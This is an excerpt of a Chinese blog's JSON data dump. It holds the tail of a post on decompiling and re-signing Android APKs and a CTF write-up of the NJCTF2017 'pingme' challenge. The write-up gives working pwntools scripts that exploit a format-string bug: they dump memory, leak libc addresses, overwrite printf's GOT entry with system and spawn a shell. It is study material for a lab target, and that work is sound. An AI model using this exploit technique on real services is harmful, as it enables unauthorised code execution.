30000</code></pre><p>生成好后就可以使用这个签名文件进行签名了</p>\n<pre><code>jarsigner -keystore 密钥库名 xxx.apk 密钥别名\n\n参数:\n    -digestalg  摘要算法\n    -sigalg     签名算法\n\n例如:\n    用JDK7及以上jarsigner签名,不支持Android 4.2 以下\n    jarsigner -keystore debug.keystore MyApp.apk release\n\n    用JDK7及以上jarsigner签名,兼容Android 4.2 以下            \n    jarsigner -keystore debug.keystore -digestalg SHA1 -sigalg SHA1withRSA MyApp.apk androiddebugkey</code></pre><p>签名就OK，剩下安装测试就行了</p>\n<p>参考</p>\n<p><a href=\"https://www.jianshu.com/p/53078d03c9bf\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/53078d03c9bf</a></p>\n<p><a href=\"https://blog.csdn.net/dreamer2020/article/details/52761606\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/dreamer2020/article/details/52761606</a></p>\n<p><a href=\"https://ibotpeaches.github.io/Apktool/\" target=\"_blank\" rel=\"noopener\">https://ibotpeaches.github.io/Apktool/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一套流程概述\"><a href=\"#一套流程概述\" class=\"headerlink\" title=\"一套流程概述\"></a>一套流程概述</h2><p>使用<code>jadx</code>反编译后找到修改的文件，通过<code>apktool</code>反编<code>apk</code>文件后，在文件中找到对应的<code>smail文件</code>，修改后使用<code>apktool</code>回编，然后再用<code>jarsigner</code> 签名生成的apk</p>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>apk本身可以使用压缩软件打开，打开后的目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214115813.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214115813.png\"></p>\n<p>这样打开的文件结构肯定是查看不完整的，很多二进制文件也不能解析</p>\n<h2 id=\"反编译APK\"><a href=\"#反编译APK\" class=\"headerlink\" title=\"反编译APK\"></a>反编译APK</h2><p><strong>apktool:逆向apk工具集</strong></p>\n<p><strong>jadx：用于从Android Dex和Apk文件生成Java源代码的命令行和GUI工具</strong></p>\n<p><strong>AndroidKiller：和jadx一样，还可以直接修改smail语句后回编APK以及添加签名</strong></p>\n<p>使用apk反编译工具<code>apktool</code>,这里不推荐用<code>AndroidKiller</code>了</p>\n<p>虽然他的反编很方便，但是连我的<code>Android studio</code>的Hello world程序都反编译不了，表示劝退好吧，而且也存在很多Bug</p>\n<p>这里不得不安利一个超级好用的软件<code>jadx</code>，具体优点如下，使用方法也比较简单，去混淆的设置是真的好</p>\n<p><a href=\"https://segmentfault.com/a/1190000012180752\" target=\"_blank\" rel=\"noopener\">jadx介绍</a></p>\n<h3 id=\"第一步jadx反编译\"><a href=\"#第一步jadx反编译\" class=\"headerlink\" title=\"第一步jadx反编译\"></a>第一步jadx反编译</h3><p>我用jadx的目的是找到需要修改的具体文本，以及修改思路</p>\n<h3 id=\"修改后的值\"><a href=\"#修改后的值\" class=\"headerlink\" title=\"修改后的值\"></a>修改后的值</h3><p>apktool 反编出smali<br>使用命令</p>\n<p><code>apktool d [apk_path]</code></p>\n<p>就可以在apk目录下创建一个文件夹</p>\n<p>对apk的所有修改都是对这个文件夹中内容进行修改</p>\n<h3 id=\"重新回编译\"><a href=\"#重新回编译\" class=\"headerlink\" title=\"重新回编译\"></a>重新回编译</h3><p>apktool 回编成apk</p>\n<p>使用命令</p>\n<p><code>apktool b [apk_folder_path]</code></p>\n<p><strong>将会在这个文件夹下生成一个dist夹，其中就有回编的apk文件</strong></p>\n<p>apktool回编的时候经常出现文件夹占用，可以使用<br><code>apktool empty-framework-dir --force</code>  清空一下历史文件夹</p>\n<h3 id=\"文件重签名\"><a href=\"#文件重签名\" class=\"headerlink\" title=\"文件重签名\"></a>文件重签名</h3><p>注意上面生成的文件还不能安装，没有签名信息，安装会失败</p>\n<p>如果是第一次使用签名，需要先生成一个,<code>keytool</code>一般的<code>JAVA</code>环境都自带</p>\n<pre><code>格式\nkeytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA\n\n参数:\n    -genkeypair  生成一条密钥对(由私钥和公钥组成)\n    -keystore    密钥库名字以及存储位置(默认当前目录)\n    -alias       密钥对的别名(密钥库可以存在多个密钥对,用于区分不同密钥对)\n    -validity    密钥对的有效期(单位: 天)\n    -keyalg      生成密钥对的算法(常用RSA/DSA,DSA只用于签名,默认采用DSA)\n    -delete      删除一条密钥\n\n提示: 可重复使用此条命令,在同一密钥库中创建多条密钥对\n\n例如:     \n    在debug.keystore中新增一对密钥,别名是release\n    keytool -genkeypair -keystore debug.keystore -alias release -validity 30000</code></pre><p>生成好后就可以使用这个签名文件进行签名了</p>\n<pre><code>jarsigner -keystore 密钥库名 xxx.apk 密钥别名\n\n参数:\n    -digestalg  摘要算法\n    -sigalg     签名算法\n\n例如:\n    用JDK7及以上jarsigner签名,不支持Android 4.2 以下\n    jarsigner -keystore debug.keystore MyApp.apk release\n\n    用JDK7及以上jarsigner签名,兼容Android 4.2 以下            \n    jarsigner -keystore debug.keystore -digestalg SHA1 -sigalg SHA1withRSA MyApp.apk androiddebugkey</code></pre><p>签名就OK，剩下安装测试就行了</p>\n<p>参考</p>\n<p><a href=\"https://www.jianshu.com/p/53078d03c9bf\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/53078d03c9bf</a></p>\n<p><a href=\"https://blog.csdn.net/dreamer2020/article/details/52761606\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/dreamer2020/article/details/52761606</a></p>\n<p><a href=\"https://ibotpeaches.github.io/Apktool/\" target=\"_blank\" rel=\"noopener\">https://ibotpeaches.github.io/Apktool/</a></p>\n"},{"title":"pwn_pingme","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png","date":"2020-03-30T16:00:00.000Z","_content":"\n\n\n## 前言\n\n本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。\n\nPLT表和GOT表的关系：https://www.jianshu.com/p/0ac63c3744dd\n\n## 演示环境及工具\n\n操作系统**linux**\n\n```shell\ncray@cray:~$ uname -a \nLinux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linux\ncray@cray:~/Documents/Demos$ ldd pingme \n\tlinux-gate.so.1 (0xf7edc000)\n\tlibc.so.6 => /lib32/libc.so.6 (0xf7cdc000)\n\t/lib/ld-linux.so.2 (0xf7edd000)\n\ncray@cray:~/Documents/Demos$ ls -la /lib32/|grep \"libc.so.6\"\nlrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -> libc-2.28.so\ncray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so \n/lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped\n```\n\n\n\n\n\n调试工具**radare2**\n\n```shell\ncray@cray:~$ r2 -v\nradare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-git\ncommit: HEAD build: 2020-05-14__12:01:18\n```\n\n\n\n\n\n样本下载\n\n\n\n### 整体思路\n\n由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。\n\n### 漏洞复现\n\n\n\n我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案\n\n```bash\n#!/bin/sh\nwhile true; do\n        num=`ps -ef | grep \"socat\" | grep -v \"grep\" | wc -l`\n        if [ $num -lt 5 ]; then\n                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &\n        fi\ndone\n```\n\n我尝试使用ncat去加载，速度相当快\n\n```shell\nncat -vc ./pingme -lk 10001\n```\n\n### 漏洞利用\n\n#### 格式化漏洞\n\n参考https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md\n\n#### 找到利用点\n\n利用点是 printf格式中`%5$s`的含义是：打印printf的第五个参数所指向的地址\n\n32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.\n\n这里使用pwntools中的exec_fmt来找利用点，原理都是一样的\n\n```python\nfrom pwn import *\np = remote('127.0.0.1', '10001')\ndef exec_fmt(payload):\n    log.info(payload)\n    p.sendline(payload)\n    info = p.recv()\n    return info\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n```\n\n输出如下\n\n```javascript\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] aaaabaaacaaadaaaeaaaSTART%1$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%2$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%3$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%4$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%5$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%6$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%7$pEND\n[*] Found format string offset: 7\n[*] Closed connection to 127.0.0.1 port 10001\n```\n\n\n\n#### dump源程序\n\n虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来\n\n通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000\n\n使用`\"%9$s.AAA\" + p32(start_addr)`格式化是因为printf在打印`\\x00`的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未`.AAA`来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.\n\ndump脚本如下\n\n```python\nfrom pwn import *\ndef dump_memory(start_addr, end_addr):\n    result = \"\"\n    while start_addr < end_addr:\n        p = remote('127.0.0.1', '10001')\n        p.recvline()\n        #print result.encode('hex')\n        payload = \"%9$s.AAA\" + p32(start_addr)\n        p.sendline(payload)\n        data = p.recvuntil(\".AAA\")[:-4]\n        if data == \"\":\n            data = \"\\x00\"\n        log.info(\"leaking: 0x%x --> %s\" % (start_addr, data.encode('hex')))\n        result += data\n        start_addr += len(data)\n        p.close()\n    return result\nstart_addr = 0x8048000\nend_addr   = 0x8049000\ncode_bin = dump_memory(start_addr, end_addr)\nwith open(\"code.bin\", \"wb\") as f:\n    f.write(code_bin)\n    f.close()\n```\n\n#### 获取printf_got\n\n拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400\n\n```shell\n[0x08048490]> is\n[Symbols]\n\nnth paddr       vaddr      bind   type   size lib name\n――――――――――――――――――――――――――――――――――――――――――――――――――――――\n11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout\n12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used\n13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin\n1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf\n2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf\n3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets\n4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm\n6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__\n7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr\n8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen\n9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main\n10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar\n```\n\n然后拿到got表中printf的地址  0x8049974\n\n```shell\n[0x08048490]> pd 3 @ 0x8048400\n        ╎   ; CALL XREF from main @ 0x8048664\n┌ 6: int sym.imp.printf (const char *format);\n│ bp: 0 (vars 0, args 0)\n│ sp: 0 (vars 0, args 0)\n│ rg: 0 (vars 0, args 0)\n└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974\n        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008\n        └─< 0x0804840b      e9d0ffffff     jmp section..plt\n```\n\n#### 获取libc_printf找到对应libc\n\n这里的got表指向的就是libc中的printf地址\n\n可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址\n\n```pyhton\nfrom pwn import *\ndef get_libc_printf():\n    addr = 0x8049974\n    p = remote('127.0.0.1', '10001')\n    p.recvline()\n    payload = \"%9$s.AAA\" + p32(addr)\n    p.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4].encode('hex')\n    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    log.info(\"leaking: 0x%x --> 0x%s\" % (addr, data))\n    p.close()\nget_libc_printf()\n```\n\n我这里输入是860结尾，去https://libc.blukat.me/中搜索\n\n![image-20200521225248944](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png)\n\n我这里由于libc版本比较新，网站没收录，所以自己导入搞一下\n\n用到开源代码https://github.com/niklasb/libc-database\n\n先加载一下libc\n\n```shell\ncray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so \nAdding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)\n  -> Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so\n  -> Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols\n  -> Writing version info\n```\n\n...（未完待续\n\n\n\n拿到偏移后\n\n\n\n#### 利用%n特性重写printf_got\n\n脚本\n\n```python\npayload = fmtstr_payload(7, {printf_got: system_addr})\np = remote('127.0.0.1', '10001')\np.recvline()\np.sendline(payload)\np.recv()\np.sendline('/bin/sh')\np.interactive()\n```\n\n\n\n最终我的exp：\n\n```python\nfrom pwn import *\ndef eeexp():\n    printf_got = 0x8049974\n    system_offset = 0x0003e9e0\n    printf_offset = 0x00052860\n\n    p = remote('127.0.0.1', '10001')\n    p.recvline()\n    payload = \"%9$s.AAA\" + p32(printf_got)\n    p.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4].encode('hex')\n    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    printf_so = eval(\"0x{}\".format(data2))\n    log.info(\"printf_so -> 0x%x\" % printf_so)\n    system_so = printf_so + (system_offset-printf_offset) \n    log.info(\"system_got -> 0x%x\" % system_so)\n\n    payload = fmtstr_payload(7,{printf_got:system_so})\n    p.sendline(payload)\n\n    p.recv()\n    p.sendline('/bin/sh')\n    p.interactive()\nif __name__ == \"__main__\":\n    eeexp()\n\n```\n\n\n\n### 参考\n\nhttps://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md","source":"_posts/pwn_NJCTF2017_pingme.md","raw":"---\ntitle: pwn_pingme\ntags: [pwn]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png\ndate: 2020-3-31\n---\n\n\n\n## 前言\n\n本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。\n\nPLT表和GOT表的关系：https://www.jianshu.com/p/0ac63c3744dd\n\n## 演示环境及工具\n\n操作系统**linux**\n\n```shell\ncray@cray:~$ uname -a \nLinux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linux\ncray@cray:~/Documents/Demos$ ldd pingme \n\tlinux-gate.so.1 (0xf7edc000)\n\tlibc.so.6 => /lib32/libc.so.6 (0xf7cdc000)\n\t/lib/ld-linux.so.2 (0xf7edd000)\n\ncray@cray:~/Documents/Demos$ ls -la /lib32/|grep \"libc.so.6\"\nlrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -> libc-2.28.so\ncray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so \n/lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped\n```\n\n\n\n\n\n调试工具**radare2**\n\n```shell\ncray@cray:~$ r2 -v\nradare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-git\ncommit: HEAD build: 2020-05-14__12:01:18\n```\n\n\n\n\n\n样本下载\n\n\n\n### 整体思路\n\n由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。\n\n### 漏洞复现\n\n\n\n我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案\n\n```bash\n#!/bin/sh\nwhile true; do\n        num=`ps -ef | grep \"socat\" | grep -v \"grep\" | wc -l`\n        if [ $num -lt 5 ]; then\n                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &\n        fi\ndone\n```\n\n我尝试使用ncat去加载，速度相当快\n\n```shell\nncat -vc ./pingme -lk 10001\n```\n\n### 漏洞利用\n\n#### 格式化漏洞\n\n参考https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md\n\n#### 找到利用点\n\n利用点是 printf格式中`%5$s`的含义是：打印printf的第五个参数所指向的地址\n\n32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.\n\n这里使用pwntools中的exec_fmt来找利用点，原理都是一样的\n\n```python\nfrom pwn import *\np = remote('127.0.0.1', '10001')\ndef exec_fmt(payload):\n    log.info(payload)\n    p.sendline(payload)\n    info = p.recv()\n    return info\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n```\n\n输出如下\n\n```javascript\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] aaaabaaacaaadaaaeaaaSTART%1$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%2$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%3$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%4$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%5$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%6$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%7$pEND\n[*] Found format string offset: 7\n[*] Closed connection to 127.0.0.1 port 10001\n```\n\n\n\n#### dump源程序\n\n虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来\n\n通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000\n\n使用`\"%9$s.AAA\" + p32(start_addr)`格式化是因为printf在打印`\\x00`的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未`.AAA`来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.\n\ndump脚本如下\n\n```python\nfrom pwn import *\ndef dump_memory(start_addr, end_addr):\n    result = \"\"\n    while start_addr < end_addr:\n        p = remote('127.0.0.1', '10001')\n        p.recvline()\n        #print result.encode('hex')\n        payload = \"%9$s.AAA\" + p32(start_addr)\n        p.sendline(payload)\n        data = p.recvuntil(\".AAA\")[:-4]\n        if data == \"\":\n            data = \"\\x00\"\n        log.info(\"leaking: 0x%x --> %s\" % (start_addr, data.encode('hex')))\n        result += data\n        start_addr += len(data)\n        p.close()\n    return result\nstart_addr = 0x8048000\nend_addr   = 0x8049000\ncode_bin = dump_memory(start_addr, end_addr)\nwith open(\"code.bin\", \"wb\") as f:\n    f.write(code_bin)\n    f.close()\n```\n\n#### 获取printf_got\n\n拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400\n\n```shell\n[0x08048490]> is\n[Symbols]\n\nnth paddr       vaddr      bind   type   size lib name\n――――――――――――――――――――――――――――――――――――――――――――――――――――――\n11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout\n12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used\n13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin\n1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf\n2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf\n3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets\n4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm\n6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__\n7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr\n8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen\n9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main\n10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar\n```\n\n然后拿到got表中printf的地址  0x8049974\n\n```shell\n[0x08048490]> pd 3 @ 0x8048400\n        ╎   ; CALL XREF from main @ 0x8048664\n┌ 6: int sym.imp.printf (const char *format);\n│ bp: 0 (vars 0, args 0)\n│ sp: 0 (vars 0, args 0)\n│ rg: 0 (vars 0, args 0)\n└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974\n        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008\n        └─< 0x0804840b      e9d0ffffff     jmp section..plt\n```\n\n#### 获取libc_printf找到对应libc\n\n这里的got表指向的就是libc中的printf地址\n\n可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址\n\n```pyhton\nfrom pwn import *\ndef get_libc_printf():\n    addr = 0x8049974\n    p = remote('127.0.0.1', '10001')\n    p.recvline()\n    payload = \"%9$s.AAA\" + p32(addr)\n    p.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4].encode('hex')\n    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    log.info(\"leaking: 0x%x --> 0x%s\" % (addr, data))\n    p.close()\nget_libc_printf()\n```\n\n我这里输入是860结尾，去https://libc.blukat.me/中搜索\n\n![image-20200521225248944](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png)\n\n我这里由于libc版本比较新，网站没收录，所以自己导入搞一下\n\n用到开源代码https://github.com/niklasb/libc-database\n\n先加载一下libc\n\n```shell\ncray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so \nAdding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)\n  -> Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so\n  -> Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols\n  -> Writing version info\n```\n\n...（未完待续\n\n\n\n拿到偏移后\n\n\n\n#### 利用%n特性重写printf_got\n\n脚本\n\n```python\npayload = fmtstr_payload(7, {printf_got: system_addr})\np = remote('127.0.0.1', '10001')\np.recvline()\np.sendline(payload)\np.recv()\np.sendline('/bin/sh')\np.interactive()\n```\n\n\n\n最终我的exp：\n\n```python\nfrom pwn import *\ndef eeexp():\n    printf_got = 0x8049974\n    system_offset = 0x0003e9e0\n    printf_offset = 0x00052860\n\n    p = remote('127.0.0.1', '10001')\n    p.recvline()\n    payload = \"%9$s.AAA\" + p32(printf_got)\n    p.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4].encode('hex')\n    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    printf_so = eval(\"0x{}\".format(data2))\n    log.info(\"printf_so -> 0x%x\" % printf_so)\n    system_so = printf_so + (system_offset-printf_offset) \n    log.info(\"system_got -> 0x%x\" % system_so)\n\n    payload = fmtstr_payload(7,{printf_got:system_so})\n    p.sendline(payload)\n\n    p.recv()\n    p.sendline('/bin/sh')\n    p.interactive()\nif __name__ == \"__main__\":\n    eeexp()\n\n```\n\n\n\n### 参考\n\nhttps://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md","slug":"pwn_NJCTF2017_pingme","published":1,"updated":"2020-07-05T08:59:36.769Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62m0011ccuq5njqtj2i","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。</p>\n<p>PLT表和GOT表的关系：<a href=\"https://www.jianshu.com/p/0ac63c3744dd\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/0ac63c3744dd</a></p>\n<h2 id=\"演示环境及工具\"><a href=\"#演示环境及工具\" class=\"headerlink\" title=\"演示环境及工具\"></a>演示环境及工具</h2><p>操作系统<strong>linux</strong></p>\n<pre><code class=\"shell\">cray@cray:~$ uname -a \nLinux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linux\ncray@cray:~/Documents/Demos$ ldd pingme \n    linux-gate.so.1 (0xf7edc000)\n    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7cdc000)\n    /lib/ld-linux.so.2 (0xf7edd000)\n\ncray@cray:~/Documents/Demos$ ls -la /lib32/|grep &quot;libc.so.6&quot;\nlrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -&gt; libc-2.28.so\ncray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so \n/lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped</code></pre>\n<p>调试工具<strong>radare2</strong></p>\n<pre><code class=\"shell\">cray@cray:~$ r2 -v\nradare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-git\ncommit: HEAD build: 2020-05-14__12:01:18</code></pre>\n<p>样本下载</p>\n<h3 id=\"整体思路\"><a href=\"#整体思路\" class=\"headerlink\" title=\"整体思路\"></a>整体思路</h3><p>由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。</p>\n<h3 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><p>我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案</p>\n<pre><code class=\"bash\">#!/bin/sh\nwhile true; do\n        num=`ps -ef | grep &quot;socat&quot; | grep -v &quot;grep&quot; | wc -l`\n        if [ $num -lt 5 ]; then\n                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;\n        fi\ndone</code></pre>\n<p>我尝试使用ncat去加载，速度相当快</p>\n<pre><code class=\"shell\">ncat -vc ./pingme -lk 10001</code></pre>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><h4 id=\"格式化漏洞\"><a href=\"#格式化漏洞\" class=\"headerlink\" title=\"格式化漏洞\"></a>格式化漏洞</h4><p>参考<a href=\"https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md\" target=\"_blank\" rel=\"noopener\">https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md</a></p>\n<h4 id=\"找到利用点\"><a href=\"#找到利用点\" class=\"headerlink\" title=\"找到利用点\"></a>找到利用点</h4><p>利用点是 printf格式中<code>%5$s</code>的含义是：打印printf的第五个参数所指向的地址</p>\n<p>32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.</p>\n<p>这里使用pwntools中的exec_fmt来找利用点，原理都是一样的</p>\n<pre><code class=\"python\">from pwn import *\np = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\ndef exec_fmt(payload):\n    log.info(payload)\n    p.sendline(payload)\n    info = p.recv()\n    return info\nauto = FmtStr(exec_fmt)\noffset = auto.offset</code></pre>\n<p>输出如下</p>\n<pre><code class=\"javascript\">[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] aaaabaaacaaadaaaeaaaSTART%1$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%2$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%3$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%4$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%5$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%6$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%7$pEND\n[*] Found format string offset: 7\n[*] Closed connection to 127.0.0.1 port 10001</code></pre>\n<h4 id=\"dump源程序\"><a href=\"#dump源程序\" class=\"headerlink\" title=\"dump源程序\"></a>dump源程序</h4><p>虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来</p>\n<p>通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000</p>\n<p>使用<code>&quot;%9$s.AAA&quot; + p32(start_addr)</code>格式化是因为printf在打印<code>\\x00</code>的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未<code>.AAA</code>来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.</p>\n<p>dump脚本如下</p>\n<pre><code class=\"python\">from pwn import *\ndef dump_memory(start_addr, end_addr):\n    result = &quot;&quot;\n    while start_addr &lt; end_addr:\n        p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\n        p.recvline()\n        #print result.encode(&#39;hex&#39;)\n        payload = 